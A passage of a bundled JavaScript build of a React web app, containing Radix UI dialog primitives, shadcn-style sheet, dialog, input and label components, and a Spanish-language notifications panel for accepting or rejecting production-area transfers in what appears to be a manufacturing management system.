  const triggerRef = React44.useRef(null);
  const contentRef = React44.useRef(null);
  const [open, setOpen] = useControllableState({
    prop: openProp,
    defaultProp: defaultOpen ?? false,
    onChange: onOpenChange,
    caller: DIALOG_NAME
  });
  return /* @__PURE__ */ jsx24(
    DialogProvider,
    {
      scope: __scopeDialog,
      triggerRef,
      contentRef,
      contentId: useId(),
      titleId: useId(),
      descriptionId: useId(),
      open,
      onOpenChange: setOpen,
      onOpenToggle: React44.useCallback(() => setOpen((prevOpen) => !prevOpen), [setOpen]),
      modal,
      children
    }
  );
};
Dialog.displayName = DIALOG_NAME;
var TRIGGER_NAME2 = "DialogTrigger";
var DialogTrigger = React44.forwardRef(
  (props, forwardedRef) => {
    const { __scopeDialog, ...triggerProps } = props;
    const context = useDialogContext(TRIGGER_NAME2, __scopeDialog);
    const composedTriggerRef = useComposedRefs(forwardedRef, context.triggerRef);
    return /* @__PURE__ */ jsx24(
      Primitive.button,
      {
        type: "button",
        "aria-haspopup": "dialog",
        "aria-expanded": context.open,
        "aria-controls": context.contentId,
        "data-state": getState(context.open),
        ...triggerProps,
        ref: composedTriggerRef,
        onClick: composeEventHandlers(props.onClick, context.onOpenToggle)
      }
    );
  }
);
DialogTrigger.displayName = TRIGGER_NAME2;
var PORTAL_NAME3 = "DialogPortal";
var [PortalProvider2, usePortalContext2] = createDialogContext(PORTAL_NAME3, {
  forceMount: void 0
});
var DialogPortal = (props) => {
  const { __scopeDialog, forceMount, children, container } = props;
  const context = useDialogContext(PORTAL_NAME3, __scopeDialog);
  return /* @__PURE__ */ jsx24(PortalProvider2, { scope: __scopeDialog, forceMount, children: React44.Children.map(children, (child) => /* @__PURE__ */ jsx24(Presence, { present: forceMount || context.open, children: /* @__PURE__ */ jsx24(Portal, { asChild: true, container, children: child }) })) });
};
DialogPortal.displayName = PORTAL_NAME3;
var OVERLAY_NAME = "DialogOverlay";
var DialogOverlay = React44.forwardRef(
  (props, forwardedRef) => {
    const portalContext = usePortalContext2(OVERLAY_NAME, props.__scopeDialog);
    const { forceMount = portalContext.forceMount, ...overlayProps } = props;
    const context = useDialogContext(OVERLAY_NAME, props.__scopeDialog);
    return context.modal ? /* @__PURE__ */ jsx24(Presence, { present: forceMount || context.open, children: /* @__PURE__ */ jsx24(DialogOverlayImpl, { ...overlayProps, ref: forwardedRef }) }) : null;
  }
);
DialogOverlay.displayName = OVERLAY_NAME;
var Slot2 = createSlot("DialogOverlay.RemoveScroll");
var DialogOverlayImpl = React44.forwardRef(
  (props, forwardedRef) => {
    const { __scopeDialog, ...overlayProps } = props;
    const context = useDialogContext(OVERLAY_NAME, __scopeDialog);
    return (
      // Make sure `Content` is scrollable even when it doesn't live inside `RemoveScroll`
      // ie. when `Overlay` and `Content` are siblings
      /* @__PURE__ */ jsx24(Combination_default, { as: Slot2, allowPinchZoom: true, shards: [context.contentRef], children: /* @__PURE__ */ jsx24(
        Primitive.div,
        {
          "data-state": getState(context.open),
          ...overlayProps,
          ref: forwardedRef,
          style: { pointerEvents: "auto", ...overlayProps.style }
        }
      ) })
    );
  }
);
var CONTENT_NAME3 = "DialogContent";
var DialogContent = React44.forwardRef(
  (props, forwardedRef) => {
    const portalContext = usePortalContext2(CONTENT_NAME3, props.__scopeDialog);
    const { forceMount = portalContext.forceMount, ...contentProps } = props;
    const context = useDialogContext(CONTENT_NAME3, props.__scopeDialog);
    return /* @__PURE__ */ jsx24(Presence, { present: forceMount || context.open, children: context.modal ? /* @__PURE__ */ jsx24(DialogContentModal, { ...contentProps, ref: forwardedRef }) : /* @__PURE__ */ jsx24(DialogContentNonModal, { ...contentProps, ref: forwardedRef }) });
  }
);
DialogContent.displayName = CONTENT_NAME3;
var DialogContentModal = React44.forwardRef(
  (props, forwardedRef) => {
    const context = useDialogContext(CONTENT_NAME3, props.__scopeDialog);
    const contentRef = React44.useRef(null);
    const composedRefs = useComposedRefs(forwardedRef, context.contentRef, contentRef);
    React44.useEffect(() => {
      const content = contentRef.current;
      if (content) return hideOthers(content);
    }, []);
    return /* @__PURE__ */ jsx24(
      DialogContentImpl,
      {
        ...props,
        ref: composedRefs,
        trapFocus: context.open,
        disableOutsidePointerEvents: true,
        onCloseAutoFocus: composeEventHandlers(props.onCloseAutoFocus, (event) => {
          event.preventDefault();
          context.triggerRef.current?.focus();
        }),
        onPointerDownOutside: composeEventHandlers(props.onPointerDownOutside, (event) => {
          const originalEvent = event.detail.originalEvent;
          const ctrlLeftClick = originalEvent.button === 0 && originalEvent.ctrlKey === true;
          const isRightClick = originalEvent.button === 2 || ctrlLeftClick;
          if (isRightClick) event.preventDefault();
        }),
        onFocusOutside: composeEventHandlers(
          props.onFocusOutside,
          (event) => event.preventDefault()
        )
      }
    );
  }
);
var DialogContentNonModal = React44.forwardRef(
  (props, forwardedRef) => {
    const context = useDialogContext(CONTENT_NAME3, props.__scopeDialog);
    const hasInteractedOutsideRef = React44.useRef(false);
    const hasPointerDownOutsideRef = React44.useRef(false);
    return /* @__PURE__ */ jsx24(
      DialogContentImpl,
      {
        ...props,
        ref: forwardedRef,
        trapFocus: false,
        disableOutsidePointerEvents: false,
        onCloseAutoFocus: (event) => {
          props.onCloseAutoFocus?.(event);
          if (!event.defaultPrevented) {
            if (!hasInteractedOutsideRef.current) context.triggerRef.current?.focus();
            event.preventDefault();
          }
          hasInteractedOutsideRef.current = false;
          hasPointerDownOutsideRef.current = false;
        },
        onInteractOutside: (event) => {
          props.onInteractOutside?.(event);
          if (!event.defaultPrevented) {
            hasInteractedOutsideRef.current = true;
            if (event.detail.originalEvent.type === "pointerdown") {
              hasPointerDownOutsideRef.current = true;
            }
          }
          const target = event.target;
          const targetIsTrigger = context.triggerRef.current?.contains(target);
          if (targetIsTrigger) event.preventDefault();
          if (event.detail.originalEvent.type === "focusin" && hasPointerDownOutsideRef.current) {
            event.preventDefault();
          }
        }
      }
    );
  }
);
var DialogContentImpl = React44.forwardRef(
  (props, forwardedRef) => {
    const { __scopeDialog, trapFocus, onOpenAutoFocus, onCloseAutoFocus, ...contentProps } = props;
    const context = useDialogContext(CONTENT_NAME3, __scopeDialog);
    const contentRef = React44.useRef(null);
    const composedRefs = useComposedRefs(forwardedRef, contentRef);
    useFocusGuards();
    return /* @__PURE__ */ jsxs5(Fragment6, { children: [
      /* @__PURE__ */ jsx24(
        FocusScope,
        {
          asChild: true,
          loop: true,
          trapped: trapFocus,
          onMountAutoFocus: onOpenAutoFocus,
          onUnmountAutoFocus: onCloseAutoFocus,
          children: /* @__PURE__ */ jsx24(
            DismissableLayer,
            {
              role: "dialog",
              id: context.contentId,
              "aria-describedby": context.descriptionId,
              "aria-labelledby": context.titleId,
              "data-state": getState(context.open),
              ...contentProps,
              ref: composedRefs,
              onDismiss: () => context.onOpenChange(false)
            }
          )
        }
      ),
      /* @__PURE__ */ jsxs5(Fragment6, { children: [
        /* @__PURE__ */ jsx24(TitleWarning, { titleId: context.titleId }),
        /* @__PURE__ */ jsx24(DescriptionWarning, { contentRef, descriptionId: context.descriptionId })
      ] })
    ] });
  }
);
var TITLE_NAME2 = "DialogTitle";
var DialogTitle = React44.forwardRef(
  (props, forwardedRef) => {
    const { __scopeDialog, ...titleProps } = props;
    const context = useDialogContext(TITLE_NAME2, __scopeDialog);
    return /* @__PURE__ */ jsx24(Primitive.h2, { id: context.titleId, ...titleProps, ref: forwardedRef });
  }
);
DialogTitle.displayName = TITLE_NAME2;
var DESCRIPTION_NAME2 = "DialogDescription";
var DialogDescription = React44.forwardRef(
  (props, forwardedRef) => {
    const { __scopeDialog, ...descriptionProps } = props;
    const context = useDialogContext(DESCRIPTION_NAME2, __scopeDialog);
    return /* @__PURE__ */ jsx24(Primitive.p, { id: context.descriptionId, ...descriptionProps, ref: forwardedRef });
  }
);
DialogDescription.displayName = DESCRIPTION_NAME2;
var CLOSE_NAME2 = "DialogClose";
var DialogClose = React44.forwardRef(
  (props, forwardedRef) => {
    const { __scopeDialog, ...closeProps } = props;
    const context = useDialogContext(CLOSE_NAME2, __scopeDialog);
    return /* @__PURE__ */ jsx24(
      Primitive.button,
      {
        type: "button",
        ...closeProps,
        ref: forwardedRef,
        onClick: composeEventHandlers(props.onClick, () => context.onOpenChange(false))
      }
    );
  }
);
DialogClose.displayName = CLOSE_NAME2;
function getState(open) {
  return open ? "open" : "closed";
}
var TITLE_WARNING_NAME = "DialogTitleWarning";
var [WarningProvider, useWarningContext] = createContext22(TITLE_WARNING_NAME, {
  contentName: CONTENT_NAME3,
  titleName: TITLE_NAME2,
  docsSlug: "dialog"
});
var TitleWarning = ({ titleId }) => {
  const titleWarningContext = useWarningContext(TITLE_WARNING_NAME);
  const MESSAGE = `\`${titleWarningContext.contentName}\` requires a \`${titleWarningContext.titleName}\` for the component to be accessible for screen reader users.

If you want to hide the \`${titleWarningContext.titleName}\`, you can wrap it with our VisuallyHidden component.

For more information, see https://radix-ui.com/primitives/docs/components/${titleWarningContext.docsSlug}`;
  React44.useEffect(() => {
    if (titleId) {
      const hasTitle = document.getElementById(titleId);
      if (!hasTitle) console.error(MESSAGE);
    }
  }, [MESSAGE, titleId]);
  return null;
};
var DESCRIPTION_WARNING_NAME = "DialogDescriptionWarning";
var DescriptionWarning = ({ contentRef, descriptionId }) => {
  const descriptionWarningContext = useWarningContext(DESCRIPTION_WARNING_NAME);
  const MESSAGE = `Warning: Missing \`Description\` or \`aria-describedby={undefined}\` for {${descriptionWarningContext.contentName}}.`;
  React44.useEffect(() => {
    const describedById = contentRef.current?.getAttribute("aria-describedby");
    if (descriptionId && describedById) {
      const hasDescription = document.getElementById(descriptionId);
      if (!hasDescription) console.warn(MESSAGE);
    }
  }, [MESSAGE, contentRef, descriptionId]);
  return null;
};
var Root4 = Dialog;
var Trigger2 = DialogTrigger;
var Portal2 = DialogPortal;
var Overlay = DialogOverlay;
var Content3 = DialogContent;
var Title2 = DialogTitle;
var Description2 = DialogDescription;
var Close2 = DialogClose;

// client/src/components/ui/sheet.tsx
import { jsx as jsx25, jsxs as jsxs6 } from "react/jsx-runtime";
var Sheet = Root4;
var SheetPortal = Portal2;
var SheetOverlay = React45.forwardRef(({ className, ...props }, ref) => /* @__PURE__ */ jsx25(
  Overlay,
  {
    className: cn(
      "fixed inset-0 z-50 bg-black/80  data-[state=open]:animate-in data-[state=closed]:animate-out data-[state=closed]:fade-out-0 data-[state=open]:fade-in-0",
      className
    ),
    ...props,
    ref
  }
));
SheetOverlay.displayName = Overlay.displayName;
var sheetVariants = cva(
  "fixed z-50 gap-4 bg-background p-6 shadow-lg transition ease-in-out data-[state=open]:animate-in data-[state=closed]:animate-out data-[state=closed]:duration-300 data-[state=open]:duration-500",
  {
    variants: {
      side: {
        top: "inset-x-0 top-0 border-b data-[state=closed]:slide-out-to-top data-[state=open]:slide-in-from-top",
        bottom: "inset-x-0 bottom-0 border-t data-[state=closed]:slide-out-to-bottom data-[state=open]:slide-in-from-bottom",
        left: "inset-y-0 left-0 h-full w-3/4 border-r data-[state=closed]:slide-out-to-left data-[state=open]:slide-in-from-left sm:max-w-sm",
        right: "inset-y-0 right-0 h-full w-3/4  border-l data-[state=closed]:slide-out-to-right data-[state=open]:slide-in-from-right sm:max-w-sm"
      }
    },
    defaultVariants: {
      side: "right"
    }
  }
);
var SheetContent = React45.forwardRef(({ side = "right", className, children, ...props }, ref) => /* @__PURE__ */ jsxs6(SheetPortal, { children: [
  /* @__PURE__ */ jsx25(SheetOverlay, {}),
  /* @__PURE__ */ jsxs6(
    Content3,
    {
      ref,
      className: cn(sheetVariants({ side }), className),
      ...props,
      children: [
        children,
        /* @__PURE__ */ jsxs6(Close2, { className: "absolute right-4 top-4 rounded-sm opacity-70 ring-offset-background transition-opacity hover:opacity-100 focus:outline-none focus:ring-2 focus:ring-ring focus:ring-offset-2 disabled:pointer-events-none data-[state=open]:bg-secondary", children: [
          /* @__PURE__ */ jsx25(X, { className: "h-4 w-4" }),
          /* @__PURE__ */ jsx25("span", { className: "sr-only", children: "Close" })
        ] })
      ]
    }
  )
] }));
SheetContent.displayName = Content3.displayName;
var SheetHeader = ({
  className,
  ...props
}) => /* @__PURE__ */ jsx25(
  "div",
  {
    className: cn(
      "flex flex-col space-y-2 text-center sm:text-left",
      className
    ),
    ...props
  }
);
SheetHeader.displayName = "SheetHeader";
var SheetFooter = ({
  className,
  ...props
}) => /* @__PURE__ */ jsx25(
  "div",
  {
    className: cn(
      "flex flex-col-reverse sm:flex-row sm:justify-end sm:space-x-2",
      className
    ),
    ...props
  }
);
SheetFooter.displayName = "SheetFooter";
var SheetTitle = React45.forwardRef(({ className, ...props }, ref) => /* @__PURE__ */ jsx25(
  Title2,
  {
    ref,
    className: cn("text-lg font-semibold text-foreground", className),
    ...props
  }
));
SheetTitle.displayName = Title2.displayName;
var SheetDescription = React45.forwardRef(({ className, ...props }, ref) => /* @__PURE__ */ jsx25(
  Description2,
  {
    ref,
    className: cn("text-sm text-muted-foreground", className),
    ...props
  }
));
SheetDescription.displayName = Description2.displayName;

// client/src/components/notifications/notifications-panel.tsx
import { Fragment as Fragment7, jsx as jsx26, jsxs as jsxs7 } from "react/jsx-runtime";
function NotificationsPanel({ open, onClose }) {
  const { toast: toast2 } = useToast();
  const queryClient2 = useQueryClient();
  const { data: pendingTransfers = [] } = useQuery({
    queryKey: ["/api/transfers/pending"],
    enabled: open
  });
  const { data: repositionNotifications = [] } = useQuery({
    queryKey: ["/api/notifications"],
    enabled: open,
    refetchInterval: 2e3,
    // Refrescar cada 2 segundos cuando el panel está abierto
    refetchIntervalInBackground: false,
    queryFn: async () => {
      const res = await apiRequest("GET", "/api/notifications");
      const allNotifications = await res.json();
      return allNotifications.filter(
        (n) => !n.read && (n.type?.includes("reposition") || n.type?.includes("completion") || n.type === "new_reposition" || n.type === "reposition_transfer" || n.type === "reposition_approved" || n.type === "reposition_rejected" || n.type === "reposition_completed" || n.type === "reposition_deleted" || n.type === "completion_approval_needed")
      );
    }
  });
  const acceptTransferMutation = useMutation({
    mutationFn: async (transferId) => {
      const res = await apiRequest("POST", `/api/transfers/${transferId}/accept`);
      return await res.json();
    },
    onSuccess: () => {
      toast2({
        title: "Transferencia aceptada",
        description: "La transferencia ha sido aceptada exitosamente"
      });
      queryClient2.invalidateQueries({ queryKey: ["/api/transfers/pending"] });
      queryClient2.invalidateQueries({ queryKey: ["/api/orders"] });
      queryClient2.invalidateQueries({ queryKey: ["/api/dashboard/stats"] });
    },
    onError: (error) => {
      toast2({
        title: "Error al aceptar",
        description: error.message,
        variant: "destructive"
      });
    }
  });
  const rejectTransferMutation = useMutation({
    mutationFn: async (transferId) => {
      const res = await apiRequest("POST", `/api/transfers/${transferId}/reject`);
      return await res.json();
    },
    onSuccess: () => {
      toast2({
        title: "Transferencia rechazada",
        description: "La transferencia ha sido rechazada"
      });
      queryClient2.invalidateQueries({ queryKey: ["/api/transfers/pending"] });
      queryClient2.invalidateQueries({ queryKey: ["/api/dashboard/stats"] });
    },
    onError: (error) => {
      toast2({
        title: "Error al rechazar",
        description: error.message,
        variant: "destructive"
      });
    }
  });
  const markNotificationReadMutation = useMutation({
    mutationFn: async (notificationId) => {
      const res = await apiRequest("POST", `/api/repositions/${notificationId}/read`);
      return await res.json();
    },
    onSuccess: () => {
      queryClient2.invalidateQueries({ queryKey: ["/api/notifications"] });
    }
  });
  const getAreaDisplayName = (area) => {
    const names = {
      corte: "Corte",
      bordado: "Bordado",
      ensamble: "Ensamble",
      plancha: "Plancha/Empaque",
      calidad: "Calidad",
      envios: "Env\xEDos",
      admin: "Admin",
      dise\u00F1o: "Dise\xF1o"
    };
    return names[area] || area;
  };
  const formatDate = (dateInput) => {
    const date = typeof dateInput === "string" ? new Date(dateInput) : dateInput;
    const now = /* @__PURE__ */ new Date();
    const diffMs = now.getTime() - date.getTime();
    const diffHours = Math.floor(diffMs / (1e3 * 60 * 60));
    const diffDays = Math.floor(diffHours / 24);
    if (diffDays > 0) {
      return `Hace ${diffDays} d\xEDa${diffDays > 1 ? "s" : ""} - ${date.toLocaleString("es-ES", {
        day: "2-digit",
        month: "2-digit",
        year: "numeric",
        hour: "2-digit",
        minute: "2-digit",
        timeZone: "America/Mexico_City"
      })}`;
    } else if (diffHours > 0) {
      return `Hace ${diffHours} hora${diffHours > 1 ? "s" : ""} - ${date.toLocaleString("es-ES", {
        hour: "2-digit",
        minute: "2-digit",
        timeZone: "America/Mexico_City"
      })}`;
    } else {
      return `Hace unos minutos - ${date.toLocaleString("es-ES", {
        hour: "2-digit",
        minute: "2-digit",
        timeZone: "America/Mexico_City"
      })}`;
    }
  };
  const getNotificationIcon = (type) => {
    switch (type) {
      case "transfer":
        return /* @__PURE__ */ jsx26(ArrowRight, { className: "w-4 h-4 text-blue-600" });
      case "order_completed":
        return /* @__PURE__ */ jsx26(CircleCheckBig, { className: "w-4 h-4 text-green-600" });
      case "order_created":
        return /* @__PURE__ */ jsx26(Plus, { className: "w-4 h-4 text-purple-600" });
      case "new_reposition":
      case "reposition_created":
        return /* @__PURE__ */ jsx26(Plus, { className: "w-4 h-4 text-purple-600" });
      case "reposition_approved":
        return /* @__PURE__ */ jsx26(CircleCheckBig, { className: "w-4 h-4 text-green-600" });
      case "reposition_rejected":
        return /* @__PURE__ */ jsx26(CircleX, { className: "w-4 h-4 text-red-600" });
      case "reposition_completed":
        return /* @__PURE__ */ jsx26(CircleCheckBig, { className: "w-4 h-4 text-green-600" });
      case "reposition_deleted":
        return /* @__PURE__ */ jsx26(Trash2, { className: "w-4 h-4 text-red-600" });
      case "reposition_transfer":
        return /* @__PURE__ */ jsx26(ArrowRight, { className: "w-4 h-4 text-blue-600" });
      case "transfer_processed":
        return /* @__PURE__ */ jsx26(RefreshCw, { className: "w-4 h-4 text-blue-600" });
      case "reposition_received":
        return /* @__PURE__ */ jsx26(Package, { className: "w-4 h-4 text-green-600" });
      case "completion_approval_needed":
        return /* @__PURE__ */ jsx26(Clock, { className: "w-4 h-4 text-yellow-600" });
      default:
        return /* @__PURE__ */ jsx26(Bell, { className: "w-4 h-4 text-gray-600" });
    }
  };
  return /* @__PURE__ */ jsx26(Sheet, { open, onOpenChange: onClose, children: /* @__PURE__ */ jsxs7(SheetContent, { className: "w-96 bg-white/60 backdrop-blur-lg border-l border-gray-200 dark:bg-gray-900/70 dark:border-gray-700 transition-all", children: [
    /* @__PURE__ */ jsx26(SheetHeader, { children: /* @__PURE__ */ jsxs7(SheetTitle, { className: "flex items-center justify-between text-xl font-semibold text-gray-800 dark:text-white", children: [
      /* @__PURE__ */ jsxs7("div", { className: "flex items-center gap-2", children: [
        /* @__PURE__ */ jsx26(Bell, { className: "text-indigo-600", size: 20 }),
        "Notificaciones"
      ] }),
      pendingTransfers.length + repositionNotifications.length > 0 && /* @__PURE__ */ jsx26(Badge, { variant: "destructive", children: pendingTransfers.length + repositionNotifications.length })
    ] }) }),
    /* @__PURE__ */ jsxs7("div", { className: "mt-6 space-y-6 overflow-y-auto h-full pb-24 custom-scroll", children: [
      repositionNotifications.length > 0 && /* @__PURE__ */ jsxs7(Fragment7, { children: [
        /* @__PURE__ */ jsx26("p", { className: "text-sm font-medium text-gray-500", children: "Reposiciones" }),
        repositionNotifications.map((notification) => /* @__PURE__ */ jsx26(
          "div",
          {
            className: "bg-white/80 dark:bg-gray-800 border border-gray-200 dark:border-gray-700 shadow-md rounded-xl p-4 transition-all duration-300 ease-out hover:shadow-xl animate-fade-in cursor-pointer",
            onClick: () => markNotificationReadMutation.mutate(notification.id),
            children: /* @__PURE__ */ jsxs7("div", { className: "flex items-start space-x-3", children: [
              /* @__PURE__ */ jsx26("div", { className: "w-9 h-9 bg-purple-100 rounded-full flex items-center justify-center", children: getNotificationIcon(notification.type) }),
              /* @__PURE__ */ jsxs7("div", { className: "flex-1", children: [
                /* @__PURE__ */ jsx26("h4", { className: "font-semibold text-gray-800 dark:text-gray-100", children: notification.title }),
                /* @__PURE__ */ jsx26("p", { className: "text-sm text-gray-600 dark:text-gray-300 mt-1", children: notification.message }),
                /* @__PURE__ */ jsxs7("div", { className: "flex items-center justify-between mt-2", children: [
                  notification.repositionId && /* @__PURE__ */ jsxs7(Badge, { variant: "outline", className: "text-xs", children: [
                    "Reposici\xF3n #",
                    notification.repositionId
                  ] }),
                  /* @__PURE__ */ jsx26("p", { className: "text-xs text-gray-500", children: formatDate(notification.createdAt) })
                ] }),
                notification.type === "completion_approval_needed" && /* @__PURE__ */ jsx26("div", { className: "mt-2 p-2 bg-yellow-50 rounded-lg border border-yellow-200", children: /* @__PURE__ */ jsx26("p", { className: "text-xs text-yellow-800 font-medium", children: "Solicitud de finalizaci\xF3n pendiente de aprobaci\xF3n" }) })
              ] })
            ] })
          },
          notification.id
        )),
        /* @__PURE__ */ jsx26("hr", { className: "border-t border-gray-300 dark:border-gray-600" })
      ] }),
      pendingTransfers.length > 0 && /* @__PURE__ */ jsxs7(Fragment7, { children: [
        /* @__PURE__ */ jsx26("p", { className: "text-sm font-medium text-gray-500", children: "Transferencias Pendientes" }),
        pendingTransfers.map((transfer) => /* @__PURE__ */ jsx26(
          "div",
          {
            className: "bg-white/80 dark:bg-gray-800 border border-gray-200 dark:border-gray-700 shadow-md rounded-xl p-4 transition-all duration-300 ease-out hover:shadow-xl animate-fade-in",
            children: /* @__PURE__ */ jsxs7("div", { className: "flex items-start space-x-3", children: [
              /* @__PURE__ */ jsx26("div", { className: "w-9 h-9 bg-yellow-100 rounded-full flex items-center justify-center", children: /* @__PURE__ */ jsx26(ArrowRight, { className: "text-yellow-600", size: 18 }) }),
              /* @__PURE__ */ jsxs7("div", { className: "flex-1", children: [
                /* @__PURE__ */ jsxs7("h4", { className: "font-semibold text-gray-800 dark:text-gray-100", children: [
                  transfer.pieces,
                  " piezas desde ",
                  getAreaDisplayName(transfer.fromArea)
                ] }),
                /* @__PURE__ */ jsx26("p", { className: "text-xs text-gray-500 mt-1", children: formatDate(transfer.createdAt) }),
                /* @__PURE__ */ jsxs7("div", { className: "flex items-center space-x-2 mt-3", children: [
                  /* @__PURE__ */ jsx26(
                    Button,
                    {
                      size: "sm",
                      className: "rounded-full",
                      onClick: () => acceptTransferMutation.mutate(transfer.id),
                      disabled: acceptTransferMutation.isPending,
                      children: "Aceptar"
                    }
                  ),
                  /* @__PURE__ */ jsx26(
                    Button,
                    {
                      size: "sm",
                      variant: "destructive",
                      className: "rounded-full",
                      onClick: () => rejectTransferMutation.mutate(transfer.id),
                      disabled: rejectTransferMutation.isPending,
                      children: "Rechazar"
                    }
                  )
                ] })
              ] })
            ] })
          },
          transfer.id
        ))
      ] }),
      /* @__PURE__ */ jsx26("hr", { className: "border-t border-gray-300 dark:border-gray-600" }),
      /* @__PURE__ */ jsx26("p", { className: "text-sm font-medium text-gray-500", children: "Sistema" }),
      /* @__PURE__ */ jsx26("div", { className: "bg-blue-50 border border-blue-200 dark:border-blue-400 rounded-xl p-4", children: /* @__PURE__ */ jsxs7("div", { className: "flex items-start space-x-3", children: [
        /* @__PURE__ */ jsx26("div", { className: "w-9 h-9 bg-blue-100 rounded-full flex items-center justify-center", children: /* @__PURE__ */ jsx26(Info, { className: "text-blue-600", size: 18 }) }),
        /* @__PURE__ */ jsxs7("div", { className: "flex-1", children: [
          /* @__PURE__ */ jsx26("h4", { className: "font-medium text-gray-900 dark:text-gray-100", children: "Sistema Actualizado" }),
          /* @__PURE__ */ jsx26("p", { className: "text-sm text-gray-700 dark:text-gray-300 mt-1", children: "Nuevas funcionalidades disponibles" }),
          /* @__PURE__ */ jsx26("p", { className: "text-xs text-gray-500 mt-2", children: "Hace 1 d\xEDa" })
        ] })
      ] }) }),
      /* @__PURE__ */ jsx26("div", { className: "bg-green-50 border border-green-200 dark:border-green-400 rounded-xl p-4", children: /* @__PURE__ */ jsxs7("div", { className: "flex items-start space-x-3", children: [
        /* @__PURE__ */ jsx26("div", { className: "w-9 h-9 bg-green-100 rounded-full flex items-center justify-center", children: /* @__PURE__ */ jsx26(CircleCheckBig, { className: "text-green-600", size: 18 }) }),
        /* @__PURE__ */ jsxs7("div", { className: "flex-1", children: [
          /* @__PURE__ */ jsx26("h4", { className: "font-medium text-gray-900 dark:text-gray-100", children: "Bienvenido a JASANA" }),
          /* @__PURE__ */ jsx26("p", { className: "text-sm text-gray-700 dark:text-gray-300 mt-1", children: "Sistema de gesti\xF3n listo para usar" }),
          /* @__PURE__ */ jsx26("p", { className: "text-xs text-gray-500 mt-2", children: "Hace 2 d\xEDas" })
        ] })
      ] }) }),
      pendingTransfers.length === 0 && repositionNotifications.length === 0 && /* @__PURE__ */ jsxs7("div", { className: "text-center py-12 text-gray-500", children: [
        /* @__PURE__ */ jsx26(Clock, { size: 48, className: "mx-auto mb-4 text-gray-300" }),
        /* @__PURE__ */ jsx26("p", { children: "No hay notificaciones pendientes" })
      ] })
    ] })
  ] }) });
}

// client/src/components/orders/create-order-modal.tsx
import { useState as useState22 } from "react";

// client/src/components/ui/dialog.tsx
import * as React46 from "react";
import { jsx as jsx27, jsxs as jsxs8 } from "react/jsx-runtime";
var Dialog2 = Root4;
var DialogTrigger2 = Trigger2;
var DialogPortal2 = Portal2;
var DialogOverlay2 = React46.forwardRef(({ className, ...props }, ref) => /* @__PURE__ */ jsx27(
  Overlay,
  {
    ref,
    className: cn(
      "fixed inset-0 z-50 bg-black/80 data-[state=open]:animate-in data-[state=closed]:animate-out data-[state=closed]:fade-out-0 data-[state=open]:fade-in-0",
      className
    ),
    ...props
  }
));
DialogOverlay2.displayName = Overlay.displayName;
var DialogContent2 = React46.forwardRef(({ className, children, ...props }, ref) => /* @__PURE__ */ jsxs8(DialogPortal2, { children: [
  /* @__PURE__ */ jsx27(DialogOverlay2, {}),
  /* @__PURE__ */ jsxs8(
    Content3,
    {
      ref,
      className: cn(
        "fixed left-[50%] top-[50%] z-50 grid w-full max-w-lg translate-x-[-50%] translate-y-[-50%] gap-4 border bg-background p-6 shadow-lg duration-200 data-[state=open]:animate-in data-[state=closed]:animate-out data-[state=closed]:fade-out-0 data-[state=open]:fade-in-0 data-[state=closed]:zoom-out-95 data-[state=open]:zoom-in-95 data-[state=closed]:slide-out-to-left-1/2 data-[state=closed]:slide-out-to-top-[48%] data-[state=open]:slide-in-from-left-1/2 data-[state=open]:slide-in-from-top-[48%] sm:rounded-lg",
        className
      ),
      ...props,
      children: [
        children,
        /* @__PURE__ */ jsxs8(Close2, { className: "absolute right-4 top-4 rounded-sm opacity-70 ring-offset-background transition-opacity hover:opacity-100 focus:outline-none focus:ring-2 focus:ring-ring focus:ring-offset-2 disabled:pointer-events-none data-[state=open]:bg-accent data-[state=open]:text-muted-foreground", children: [
          /* @__PURE__ */ jsx27(X, { className: "h-4 w-4" }),
          /* @__PURE__ */ jsx27("span", { className: "sr-only", children: "Close" })
        ] })
      ]
    }
  )
] }));
DialogContent2.displayName = Content3.displayName;
var DialogHeader = ({
  className,
  ...props
}) => /* @__PURE__ */ jsx27(
  "div",
  {
    className: cn(
      "flex flex-col space-y-1.5 text-center sm:text-left",
      className
    ),
    ...props
  }
);
DialogHeader.displayName = "DialogHeader";
var DialogFooter = ({
  className,
  ...props
}) => /* @__PURE__ */ jsx27(
  "div",
  {
    className: cn(
      "flex flex-col-reverse sm:flex-row sm:justify-end sm:space-x-2",
      className
    ),
    ...props
  }
);
DialogFooter.displayName = "DialogFooter";
var DialogTitle2 = React46.forwardRef(({ className, ...props }, ref) => /* @__PURE__ */ jsx27(
  Title2,
  {
    ref,
    className: cn(
      "text-lg font-semibold leading-none tracking-tight",
      className
    ),
    ...props
  }
));
DialogTitle2.displayName = Title2.displayName;
var DialogDescription2 = React46.forwardRef(({ className, ...props }, ref) => /* @__PURE__ */ jsx27(
  Description2,
  {
    ref,
    className: cn("text-sm text-muted-foreground", className),
    ...props
  }
));
DialogDescription2.displayName = Description2.displayName;

// client/src/components/ui/input.tsx
import * as React47 from "react";
import { jsx as jsx28 } from "react/jsx-runtime";
var Input = React47.forwardRef(
  ({ className, type, ...props }, ref) => {
    return /* @__PURE__ */ jsx28(
      "input",
      {
        type,
        className: cn(
          "flex h-10 w-full rounded-md border border-input bg-background px-3 py-2 text-base ring-offset-background file:border-0 file:bg-transparent file:text-sm file:font-medium file:text-foreground placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50 md:text-sm",
          className
        ),
        ref,
        ...props
      }
    );
  }
);
Input.displayName = "Input";

// client/src/components/ui/label.tsx
import * as React49 from "react";

// node_modules/@radix-ui/react-label/dist/index.mjs
import * as React48 from "react";
import { jsx as jsx29 } from "react/jsx-runtime";
var NAME3 = "Label";
var Label = React48.forwardRef((props, forwardedRef) => {
  return /* @__PURE__ */ jsx29(
    Primitive.label,
    {
      ...props,
      ref: forwardedRef,
      onMouseDown: (event) => {
        const target = event.target;
        if (target.closest("button, input, select, textarea")) return;
        props.onMouseDown?.(event);
        if (!event.defaultPrevented && event.detail > 1) event.preventDefault();
      }
    }
  );
});
Label.displayName = NAME3;
var Root5 = Label;

// client/src/components/ui/label.tsx
import { jsx as jsx30 } from "react/jsx-runtime";
var labelVariants = cva(
  "text-sm font-medium leading-none peer-disabled:cursor-not-allowed peer-disabled:opacity-70"
);
var Label2 = React49.forwardRef(({ className, ...props }, ref) => /* @__PURE__ */ jsx30(
  Root5,
  {
    ref,
    className: cn(labelVariants(), className),
    ...props
  }
));
Label2.displayName = Root5.displayName;

// client/src/components/ui/select.tsx
import * as React53 from "react";

// node_modules/@radix-ui/react-select/dist/index.mjs
import * as React52 from "react";
import * as ReactDOM5 from "react-dom";

// node_modules/@radix-ui/number/dist/index.mjs
function clamp2(value, [min3, max3]) {
